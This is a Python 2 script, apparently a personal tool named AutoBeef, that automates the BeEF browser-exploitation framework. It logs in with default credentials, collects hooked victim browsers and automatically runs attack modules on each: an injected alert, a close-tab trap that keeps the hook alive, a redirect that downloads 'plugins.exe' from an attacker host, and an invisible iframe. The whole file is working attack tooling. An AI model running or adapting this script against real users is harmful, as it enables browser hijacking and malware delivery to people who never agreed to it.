#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ** Author: ssooking
# ** Name： AutoBeef.py

import json
import urllib2
import time

hostlist = []
hostdict = {}


# 1、获得API key
def getauthkey(host):
	# host 是hook页面的url
	# /api/admin/login是用户登录接口，通过
	# 该接口登录之后，我们可以得到用于会话认证的API key
    apiurl =  host + "api/admin/login"		 
    logindata = {
        "username":"beef",
        "password":"beef"
    }
	 # 对数据进行JSON格式化编码
    jdata = json.dumps(logindata)            
	 # 生成页面请求的完整数据
    req = urllib2.Request(apiurl, jdata)     
	# 发送页面请求
    response = urllib2.urlopen(req)           
	# 获取服务器返回的页面信息，数据类型为str
    resdata = response.read()                 
	# 把数据解析成python对象，此时返回dict数据
    jsondata =  json.loads(resdata)           
    return jsondata['token']

	
# 2、获得hook主机列表,session值就是cookie
def getHookedBrowsersSession(host,authkey):
	# 用到了前面的API key
    f = urllib2.urlopen(host + "/api/hooks?token=" + authkey)
    data = json.loads(f.read())
    hookonline = data['hooked-browsers']['online']
    for x in hookonline:
        hookid = hookonline[x]['id']
        hookip = hookonline[x]['ip']
        hooksession = hookonline[x]['session']
        if hookid not in hostdict:
            hostdict[hookid] = hooksession
            print "\n[+] Hooked host id:  " + bytes(hookid) + "\n   >>> IP: " + bytes(hookip) + "\n   >>> Session: " + hooksession

#3、模块使用			
#受害者在试图关闭选项卡时会向用户显示"关闭确认"对话框，
#通过这种方式来增加shell的存活时间
# persistence -> confirm close tab
def sendConfirm(host, session, authkey):
    postdata = '{}'
    url = host + "api/modules/" + session + "/46?token=" + authkey
    #print url
    req = urllib2.Request(url, postdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    f = urllib2.urlopen(req)
    print "   >>> [+] Module Confirm Close Tab has been Executed ! "
    return f.read()			
	
	
# 使用beef模块，弹窗功能
# Misc -> IBM iNotes -> RAW js
def execJavascript(host, session, authkey):

    payload={
        "cmd":"alert('Hello by ssooking!');"
    }
	# 169是beef模块的id
    apiurl = host + "api/modules/" + session + "/3?token=" + authkey
    jdata = json.dumps(payload)
    req = urllib2.Request(apiurl, jdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    response = urllib2.urlopen(req)
    resdata = response.read()
    print "   >>> [+] Module Raw JavaScript has been Executed ! "
    return resdata

# 使受害者浏览器跳转到一个下载页面并下载。。。

def redirectBrowser(host, session, authkey):
    payload = {"redirect_url":"http://192.168.137.134:8000/plugins.exe"}
    apiurl = host + "api/modules/" + session + "/42?token=" + authkey
    jdata = json.dumps(payload)
    req = urllib2.Request(apiurl, jdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    response = urllib2.urlopen(req)
    resdata = response.read()
    jsondata =  json.loads(resdata)
    print "   >>> [+] Module Redirect Browser has been Executed ! "
    return jsondata

	
# 创建一个隐藏的Frame,target是目的地的url
# Misc -> IBM iNotes -> Create Invisible iframe
def createIFrame(host, sessionId, authkey):
    postdata = '{"target":"http://192.168.137.134:8000/"}'
    url = host + "api/modules/" + sessionId + "/4?token1=" + authkey
    req = urllib2.Request(url, postdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    f = urllib2.urlopen(req)
    print "   >>> [+] Module Create Invisible Iframe has been Executed ! "
    return f.read()



	
def autoRunModules(host,session,authkey):
    # sendConfirm(host, session, authkey)
    execJavascript(host, session, authkey)
    # redirectBrowser(host, session, authkey)


def timeRun(interval,host):
    authkey = getauthkey(host)
    print "[+] AutoBeef is running...."
    print "[+] BeEF KEY is : "+ authkey
    print "[+] Base BeEF API URL: "+ host + "api/"
    print "[+] Hook URL   : " + host + "hook.js"
    print "[+] Hook Demo  : " + host + "demos/basic.html"
    while True:
        try:
            getHookedBrowsersSession(host, authkey)
            for x in hostdict:
                if hostdict[x] not in hostlist:
                    hostlist.append(hostdict[x])
                    autoRunModules(host,hostdict[x],authkey)
            time.sleep(interval)
        except Exception, e:
            print e

if __name__ == '__main__':
    beefhost = "http://192.168.137.134:3000/"
    timeRun(3,beefhost)